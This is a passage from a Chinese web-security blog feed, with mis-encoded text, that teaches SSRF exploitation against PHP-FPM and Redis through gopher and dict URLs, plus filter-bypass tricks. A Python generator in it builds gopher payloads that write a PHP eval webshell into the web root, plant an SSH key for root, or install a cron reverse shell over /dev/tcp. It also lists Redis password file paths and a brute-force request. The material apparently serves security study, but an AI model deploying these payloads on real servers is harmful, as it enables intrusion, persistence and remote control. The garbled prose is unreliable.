href="https://www.freebuf.com/articles/web/263342.html">https://www.freebuf.com/articles/web/263342.html</a></p><ul><li>FPMæ˜¯ä»€ä¹ˆ</li></ul><blockquote><p>å½“æˆ‘ä»¬çš„webæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚phpæ–‡ä»¶çš„è¯·æ±‚æ—¶ï¼Œå°±è®©php-fpmæŠŠå…¶è§£é‡Š(ç¿»è¯‘)æˆhtmlæ ¼å¼çš„æ–‡ä»¶(äº‹å®ä¸Šphp-fpmæ­£æ˜¯å¹²è¿™ä¸ªäº‹çš„)ï¼Œç„¶åæˆ‘ä»¬çš„webæœåŠ¡å™¨å°†ç¿»è¯‘å‡ºæ¥çš„.htmlæ–‡ä»¶å‘ç»™æµè§ˆå™¨ã€‚</p><p>è€Œphp-fpmèƒ½å¤Ÿè¿›è¡Œç¿»è¯‘ä¾é çš„å°±æ˜¯Fastcgié€šä¿¡åè®®ã€‚</p></blockquote><p><img src="/../images/1612761214_6020c87ec0101f355f51a.png!small" alt="1612761214_6020c87ec0101f355f51a.png!small"></p><ul><li><p>æ¼æ´æˆå› </p><blockquote><p>PHP-FPMé»˜è®¤ç›‘å¬9000ç«¯å£ï¼Œå¦‚æœè¿™ä¸ªç«¯å£æš´éœ²åœ¨å…¬ç½‘ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è‡ªå·±æ„é€ fastcgiåè®®ï¼Œå’Œfpmè¿›è¡Œé€šä¿¡ã€‚</p><p>fastcgiåè®®ä¼ è¾“çš„æ•°æ®å…¶å®å°±æ˜¯PHPç¯å¢ƒå˜é‡çš„ä¸€éƒ¨åˆ†ã€‚</p><p>é€šè¿‡è®¾ç½®<code>auto_prepend_file = php://input</code>ä¸”<code>allow_url_include = On</code>ï¼Œç„¶åå°†æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„ä»£ç æ”¾åœ¨Bodyä¸­ï¼Œå³å¯æ‰§è¡Œä»»æ„ä»£ç ã€‚</p></blockquote></li><li><p>ä½¿ç”¨æ¡ä»¶</p><blockquote><p>PHPæœåŠ¡å™¨å¼€å¯fastcgiçš„ç«¯å£9000</p><p>èƒ½å¤Ÿæ‰¾åˆ°PHPæœåŠ¡å™¨ä¸Šçš„phpæ–‡ä»¶</p></blockquote></li><li><p>åˆ©ç”¨</p><p><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">exp</a></p><ul><li><p>ç›‘å¬ç«¯å£ï¼š<code>nc -lvp 9000&gt;1.txt</code></p></li><li><p>ä½¿ç”¨expï¼š<code>python fpm.py -c &quot;payload&quot; -p 9000 127.0.0.1 phpæ–‡ä»¶è·¯å¾„</code></p></li><li><p>å°†ç”Ÿæˆçš„1.txtè¿›è¡ŒåŒurlç¼–ç ï¼š<code>python 1.py</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.py</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">r&#x27;1.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">s = urllib.parse.quote(s)</span><br><span class="line">s = urllib.parse.quote(s)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gopher://127.0.0.1:9000/_&quot;</span>+s)</span><br></pre></td></tr></table></figure></li><li><p>åˆ©ç”¨å¾—åˆ°çš„ç»“æœè¿›è¡Œæ”»å‡»</p><p><img src="/../images/image-20220805192301243.png" alt="image-20220805192301243"></p></li></ul></li></ul><h4 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h4><h5 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h5><p><a href="https://www.freebuf.com/articles/network/280984.html">https://www.freebuf.com/articles/network/280984.html</a></p><h5 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h5><p><a href="https://blog.csdn.net/qq_41384743/article/details/98211366">Redisæ•°æ®åº“å¸¸ç”¨å‘½ä»¤</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¯åŠ¨</span></span><br><span class="line">redis-server /etc/redis.conf</span><br><span class="line">redis-cli</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è¿›å…¥å‘½ä»¤è¡Œå</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¯†ç </span></span><br><span class="line">config get requirepass # æŸ¥çœ‹å¯†ç </span><br><span class="line">config set requirepass passwd # è®¾ç½®å¯†ç </span><br><span class="line">auth passwd # è®¤è¯</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä¿¡æ¯</span></span><br><span class="line">info</span><br></pre></td></tr></table></figure><h5 id="redisæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šä¿¡"><a href="#redisæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šä¿¡" class="headerlink" title="redisæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šä¿¡"></a>redisæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šä¿¡</h5><p><code>Redis</code>æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šè¿‡<code>RESP</code>ï¼ˆREdis Serialization Protocolï¼‰åè®®é€šä¿¡ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; auth 123456</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; set name khaz</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get name</span><br><span class="line">&quot;khaz&quot;</span><br></pre></td></tr></table></figure><p>å¯¹åº”çš„æ•°æ®åŒ…å¦‚ä¸‹ï¼Œæ¯ä¸€è¡Œéƒ½æ˜¯ç”¨<code>\r\n</code>éš”å¼€çš„ã€‚</p><p><img src="/../images/image-20221118232305305.png" alt="image-20221118232305305"></p><h5 id="ä½ç‰ˆæœ¬æƒ…å†µ"><a href="#ä½ç‰ˆæœ¬æƒ…å†µ" class="headerlink" title="ä½ç‰ˆæœ¬æƒ…å†µ"></a>ä½ç‰ˆæœ¬æƒ…å†µ</h5><p>é…åˆhttpè¯·æ±‚</p><blockquote><p>ä½ç‰ˆæœ¬çš„Redisä¼šå°†httpè¯·æ±‚çš„è¯·æ±‚å¤´å†…å®¹ä½œä¸ºrediså‘½ä»¤è§£æ</p></blockquote><h5 id="éœ€è¦è®¤è¯æƒ…å†µ"><a href="#éœ€è¦è®¤è¯æƒ…å†µ" class="headerlink" title="éœ€è¦è®¤è¯æƒ…å†µ"></a>éœ€è¦è®¤è¯æƒ…å†µ</h5><h5 id="å…ˆæ‰¾åˆ°redisæœåŠ¡çš„è®¤è¯å¯†ç ï¼Œè½¬åˆ°æœªæˆæƒæƒ…å†µ"><a href="#å…ˆæ‰¾åˆ°redisæœåŠ¡çš„è®¤è¯å¯†ç ï¼Œè½¬åˆ°æœªæˆæƒæƒ…å†µ" class="headerlink" title="å…ˆæ‰¾åˆ°redisæœåŠ¡çš„è®¤è¯å¯†ç ï¼Œè½¬åˆ°æœªæˆæƒæƒ…å†µ"></a>å…ˆæ‰¾åˆ°redisæœåŠ¡çš„è®¤è¯å¯†ç ï¼Œè½¬åˆ°æœªæˆæƒæƒ…å†µ</h5><ul><li><p>é…ç½®æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é€šè¿‡requirepassæ¥å®šä½å¯†ç </span></span><br><span class="line">/etc/redis.conf</span><br><span class="line">/etc/redis/redis.conf</span><br><span class="line">/usr/local/redis/etc/redis.conf</span><br><span class="line">/opt/redis/ect/redis.conf</span><br></pre></td></tr></table></figure></li><li><p>å¼±å¯†ç çˆ†ç ´</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dict</span>://<span class="number">192.168</span><span class="number">.174</span><span class="number">.129</span>:<span class="number">6379</span>/AUTH passwd</span><br></pre></td></tr></table></figure><p>è®¤è¯æˆåŠŸ</p><p><img src="/../images/image-20221118222335249.png" alt="image-20221118222335249"></p><p>è®¤è¯å¤±è´¥</p><p><img src="/../images/image-20221118222420964.png" alt="image-20221118222420964"></p></li></ul><h5 id="æœªæˆæƒæƒ…å†µ"><a href="#æœªæˆæƒæƒ…å†µ" class="headerlink" title="æœªæˆæƒæƒ…å†µ"></a>æœªæˆæƒæƒ…å†µ</h5><h5 id="é…åˆdictåè®®"><a href="#é…åˆdictåè®®" class="headerlink" title="é…åˆdictåè®®"></a>é…åˆdictåè®®</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">dict:<span class="comment">//x.x.x.x:6379/&lt;Redis å‘½ä»¤&gt;</span></span><br></pre></td></tr></table></figure><h5 id="é…åˆgopheråè®®"><a href="#é…åˆgopheråè®®" class="headerlink" title="é…åˆgopheråè®®"></a>é…åˆgopheråè®®</h5><p>é¦–å…ˆè¦å°†å‘½ä»¤è½¬æ¢ä¸ºRESPåè®®æ ¼å¼</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request, urllib.parse, urllib.error</span><br><span class="line"></span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;192.168.163.128&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™é©¬</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span> <span class="comment">#å†™å…¥çš„æ–‡ä»¶å†…å®¹</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span> <span class="comment"># webç›®å½•</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™sshå…¬é’¥</span></span><br><span class="line">/*</span><br><span class="line">filename=<span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">ssh_pub=<span class="string">&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n&quot;</span></span><br><span class="line">path=<span class="string">&quot;/root/.ssh/&quot;</span></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡åˆ’ä»»åŠ¡åå¼¹shell  ç³»ç»Ÿå¿…é¡»ä¸ºCentosï¼Œå®šæ—¶ä»»åŠ¡æƒé™é—®é¢˜ï¼šCentos--644  Ubuntu--600</span></span><br><span class="line">/*</span><br><span class="line">reverse_ip=<span class="string">&quot;192.168.163.132&quot;</span></span><br><span class="line">reverse_port=<span class="string">&quot;2333&quot;</span></span><br><span class="line">cron=<span class="string">&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n&quot;</span>%(reverse_ip,reverse_port)</span><br><span class="line">filename=<span class="string">&quot;root&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/spool/cron&quot;</span></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœrediséœ€è¦è®¤è¯ï¼Œå°±åœ¨cmdç¬¬ä¸€è¡Œæ’å…¥è®¤è¯å‘½ä»¤</span></span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">    </span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span>  <span class="comment"># &quot;/_&quot; gopheråè®®ç‰¹æ€§ï¼Œä¼šåƒæ‰urlåçš„ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h5 id="ä¸»ä»å¤åˆ¶"><a href="#ä¸»ä»å¤åˆ¶" class="headerlink" title="ä¸»ä»å¤åˆ¶"></a>ä¸»ä»å¤åˆ¶</h5><p><a href="https://xz.aliyun.com/t/5665#toc-10">https://xz.aliyun.com/t/5665#toc-10</a></p><h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h4><p><a href="https://paper.seebug.org/510/">https://paper.seebug.org/510/</a></p><h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p>[æ€»ç»“](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server</a> Side Request Forgery)</p><p><a href="https://cloud.tencent.com/developer/article/1942119">https://cloud.tencent.com/developer/article/1942119</a></p><h4 id="é‡å®šå‘ç»•è¿‡"><a href="#é‡å®šå‘ç»•è¿‡" class="headerlink" title="é‡å®šå‘ç»•è¿‡"></a>é‡å®šå‘ç»•è¿‡</h4><p><a href="https://www.urlc.cn/">çŸ­é“¾æ¥ç”Ÿæˆ</a></p><blockquote><p>çŸ­é“¾æ¥åŸç†</p><p>ç”Ÿæˆä¸€ä¸ªå…¨å±€å”¯ä¸€IDï¼Œä¿å­˜è¿™ä¸ªçŸ­é“¾å’ŒåŸå§‹é“¾æ¥çš„æ˜ å°„å…³ç³»ï¼Œä¸€èˆ¬é€šè¿‡302é‡å®šå‘çš„æ–¹å¼ä»çŸ­é“¾è·³è½¬åˆ°åŸå§‹é“¾æ¥ã€‚</p><p><a href="https://www.zhihu.com/question/19852154/answer/2500070994">çŸ­ç½‘å€æœåŠ¡çš„åŸç†æ˜¯ä»€ä¹ˆï¼Ÿ - æ¼‚æµçš„ç¨‹åºå‘˜çš„å›ç­” - çŸ¥ä¹</a></p></blockquote><h4 id="æ•°å­—ipåœ°å€"><a href="#æ•°å­—ipåœ°å€" class="headerlink" title="æ•°å­—ipåœ°å€"></a>æ•°å­—ipåœ°å€</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$ip</span>);</span><br><span class="line"><span class="variable">$r</span> = (<span class="variable">$ip</span>[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (<span class="variable">$ip</span>[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (<span class="variable">$ip</span>[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | <span class="variable">$ip</span>[<span class="number">3</span>] ;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$r</span> &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">    <span class="variable">$r</span> += <span class="number">4294967296</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;åè¿›åˆ¶:&quot;</span>.<span class="variable">$r</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;å…«è¿›åˆ¶:0&quot;</span>.<span class="title function_ invoke__">decoct</span>(<span class="variable">$r</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;åå…­è¿›åˆ¶:0x&quot;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="ipåœ°å€çœç•¥å½¢å¼"><a href="#ipåœ°å€çœç•¥å½¢å¼" class="headerlink" title="ipåœ°å€çœç•¥å½¢å¼"></a>ipåœ°å€çœç•¥å½¢å¼</h4><blockquote><p>å¯ä»¥çœç•¥ipåœ°å€ä¸­é—´çš„0</p><p>å¦‚127.1 &#x3D;&#x3D; 127.0.0.1</p></blockquote><p><img src="/../images/image-20230328171933107.png" alt="image-20230328171933107"></p><h4 id=""><a href="#" class="headerlink" title="@,#"></a>@,#</h4><p><img src="/../images/image-20220204213349476.png" alt="image-20220204213349476"></p><p><a href="http://baidu.com@khaz.top/">http://baidu.com@khaz.top</a>  &#x3D;&gt;  <a href="http://khaz.top/">http://khaz.top</a></p><blockquote><p>åªè§£ææœ€åä¸€ä¸ª@åé¢çš„åŸŸå</p></blockquote><p><img src="/../images/image-20220504125707388.png" alt="image-20220504125707388"></p><p><a href="http://khaz.top/#baidu.com">http://khaz.top#baidu.com</a> &#x3D;&gt; <a href="http://khaz.top/">http://khaz.top</a></p><p><img src="/../images/image-20220504153148066.png" alt="image-20220504153148066"></p><h4 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h4><p><a href="https://www.cnblogs.com/mysticbinary/p/14470551.html">DNS Rebindingæ¼æ´åŸç† - Mysticbinary - åšå®¢å›­</a></p><ul><li><p>çŸ¥é“åˆ›å®‡åœ¨çº¿</p><p><a href="http://ceye.io/dns-rebinding">http://ceye.io/dns-rebinding</a></p><p><img src="/../images/image-20230319151337356.png" alt="image-20230319151337356"></p><p><img src="/../images/image-20230319151322924.png" alt="image-20230319151322924"></p></li><li><p>åŒä¸€ä¸ªåŸŸåç»‘å®šä¸¤æ¡Aè®°å½•ã€‚è¿™æ ·è§£ææ˜¯éšæœºçš„ã€‚ </p><p>è‡ªå·±çš„æœåŠ¡å™¨ï¼š</p><p><img src="/../images/image-20220805221419076.png" alt="image-20220805221419076"></p><blockquote><p>éœ€è¦å¤šè¯•å‡ æ¬¡ï¼Œç¢°è¿æ°”ã€‚</p><p>å½“æœåŠ¡å™¨ç¬¬ä¸€æ¬¡è§£æå‡ºæ¥æ˜¯ä¸ªå¤–ç½‘ipï¼Œç¬¬äºŒæ¬¡è§£æå‡ºæ¥æ˜¯ä¸ªå†…ç½‘ipçš„æ—¶å€™æ”»å‡»å°±æˆåŠŸäº†</p></blockquote></li><li><p>è‡ªå»º</p><p><a href="https://xz.aliyun.com/t/7495#toc-6">https://xz.aliyun.com/t/7495#toc-6</a></p></li></ul><h4 id="æœ¬åœ°åœ°å€ä¸åŒå½¢å¼"><a href="#æœ¬åœ°åœ°å€ä¸åŒå½¢å¼" class="headerlink" title="æœ¬åœ°åœ°å€ä¸åŒå½¢å¼"></a>æœ¬åœ°åœ°å€ä¸åŒå½¢å¼</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipï¼š127.0.0.1 --&gt; 127ã€‚0ã€‚0ã€‚1</span><br><span class="line">åŸŸåï¼šlocalhost</span><br><span class="line">ipv6ï¼š</span><br></pre></td></tr></table></figure><h4 id="urlä¸­çš„unicodeæ¬ºéª—"><a href="#urlä¸­çš„unicodeæ¬ºéª—" class="headerlink" title="urlä¸­çš„unicodeæ¬ºéª—"></a>urlä¸­çš„unicodeæ¬ºéª—</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ </span><br><span class="line">â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ </span><br><span class="line">â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› </span><br><span class="line">â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ </span><br><span class="line">â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ </span><br><span class="line">â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© </span><br><span class="line">â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ </span><br><span class="line">â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿</span><br></pre></td></tr></table></figure><h4 id="xip-io"><a href="#xip-io" class="headerlink" title="xip.io"></a>xip.io</h4><p><img src="/../images/image-20230603222133775.png" alt="image-20230603222133775"></p><h2 id="æ¼æ´ä¿®å¤-1"><a href="#æ¼æ´ä¿®å¤-1" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>![å±å¹•æˆªå›¾ 2023-03-22 101713](..&#x2F;images&#x2F;å±å¹•æˆªå›¾ 2023-03-22 101713.png)</p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://www.wangan.com/articles/1238#59315b">https://www.wangan.com/articles/1238#59315b</a></p><p><a href="https://zhuanlan.zhihu.com/p/112055947">https://zhuanlan.zhihu.com/p/112055947</a></p><p><a href="https://joychou.org/web/phpssrf.html#directory0811578052187574410">https://joychou.org/web/phpssrf.html#directory0811578052187574410</a></p><p><a href="https://www.sqlsec.com/2021/05/ssrf.html">https://www.sqlsec.com/2021/05/ssrf.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPä»£ç å®¡è®¡</title>
      <link href="/2023/05/31/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2023/05/31/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<ul><li><p><input checked="" disabled="" type="checkbox"> BlueCMS</p></li><li><p><input checked="" disabled="" type="checkbox"> SeaCMS</p></li><li><p><input checked="" disabled="" type="checkbox"> DedeCMS</p></li><li><p><input checked="" disabled="" type="checkbox"> ThinkPHP</p></li></ul><h1 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h1><p><a href="https://blog.csdn.net/Xxy605/article/details/120973447">https://blog.csdn.net/Xxy605/article/details/120973447</a></p><h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><p>From <a href="https://www.anquanke.com/post/id/265092#h3-5">https://www.anquanke.com/post/id/265092#h3-5</a></p><ul><li>å‡½æ•°é›†æ–‡ä»¶ï¼Œé€šå¸¸å‘½ååŒ…å«functionæˆ–è€…commonç­‰å…³é”®å­—ï¼Œè¿™äº›æ–‡ä»¶é‡Œé¢æ˜¯ä¸€äº›å…¬å…±çš„å‡½æ•°ï¼Œæä¾›å…¶ä»–æ–‡ä»¶ç»Ÿä¸€è°ƒç”¨ï¼Œæ‰€ä»¥å¤§å¤šæ•°æ–‡ä»¶éƒ½ä¼šåœ¨æ–‡ä»¶å¤´éƒ¨åŒ…å«åˆ°å…¶ä»–æ–‡ä»¶ã€‚å¯»æ‰¾è¿™äº›æ–‡ä»¶ä¸€ä¸ªéå¸¸å¥½ç”¨çš„æŠ€å·§å°±æ˜¯å»æ‰“å¼€index.phpæˆ–è€…ä¸€äº›åŠŸèƒ½æ€§æ–‡ä»¶ï¼Œåœ¨å¤´éƒ¨ä¸€èˆ¬éƒ½èƒ½æ‰¾åˆ°ã€‚</li><li>é…ç½®æ–‡ä»¶ï¼Œé€šå¸¸å‘½åä¸­åŒ…æ‹¬configå…³é”®å­—ï¼Œé…ç½®æ–‡ä»¶åŒ…æ‹¬webç¨‹åºè¿è¡Œå¿…é¡»çš„åŠŸèƒ½æ€§é…ç½®é€‰é¡¹ä»¥åŠæ•°æ®åº“ç­‰é…ç½®ä¿¡æ¯ã€‚ä»è¿™ä¸ªæ–‡ä»¶ä¸­å¯ä»¥äº†è§£ç¨‹åºçš„å°éƒ¨åˆ†åŠŸèƒ½ï¼Œå¦å¤–çœ‹è¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™æ³¨æ„è§‚å¯Ÿé…ç½®æ–‡ä»¶ä¸­å‚æ•°å€¼æ˜¯å•å¼•å·è¿˜æ˜¯ç”¨åŒå¼•å·æ‹¬èµ·æ¥ï¼Œå¦‚æœæ˜¯åŒå¼•å·å¯èƒ½å°±å­˜åœ¨ä»£ç æ‰§è¡Œçš„é—®é¢˜äº†ã€‚</li><li>å®‰å…¨è¿‡æ»¤æ–‡ä»¶ï¼Œå®‰å…¨è¿‡æ»¤æ–‡ä»¶å¯¹ä»£ç å®¡è®¡è‡³å…³é‡è¦ï¼Œè¿™å…³ç³»åˆ°æˆ‘ä»¬æŒ–æ˜åˆ°çš„å¯ä»¥ç‚¹èƒ½å¦ç›´æ¥åˆ©ç”¨ï¼Œé€šå¸¸å‘½åä¸­å¸¦æœ‰filterã€safeã€checkç­‰å…³é”®å­—ï¼Œè¿™ç±»æ–‡ä»¶ä¸»è¦æ˜¯å¯¹å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¤§å¤šæ•°çš„åº”ç”¨å…¶å®ä¼šåœ¨å‚æ•°çš„è¾“å…¥åšä¸€ä¸‹addslashes()å‡½æ•°çš„è¿‡æ»¤ã€‚</li><li>indexæ–‡ä»¶ï¼Œindexæ˜¯ä¸€ä¸ªç¨‹åºçš„å…¥å£ï¼Œæ‰€ä»¥é€šå¸¸æˆ‘ä»¬åªè¦è¯»ä¸€è¯»indexæ–‡ä»¶å°±å¯ä»¥å¤§è‡´äº†è§£æ•´ä¸ªç¨‹åºçš„æ¶æ„ã€è¿è¡Œçš„æµç¨‹ã€åŒ…å«åˆ°çš„æ–‡ä»¶ï¼Œå…¶ä¸­æ ¸å¿ƒçš„æ–‡ä»¶æœ‰å“ªäº›ã€‚è€Œä¸åŒç›®å½•çš„indexæ–‡ä»¶ä¹Ÿæœ‰ä¸åŒçš„å®ç°æ–¹å¼ï¼Œå»ºè®®æœ€å¥½å°†å‡ ä¸ªæ ¸å¿ƒç›®å½•çš„indexæ–‡ä»¶éƒ½é€šè¯»ä¸€éã€‚</li></ul><h1 id="æ€»ç»“å¤§è‡´æµç¨‹"><a href="#æ€»ç»“å¤§è‡´æµç¨‹" class="headerlink" 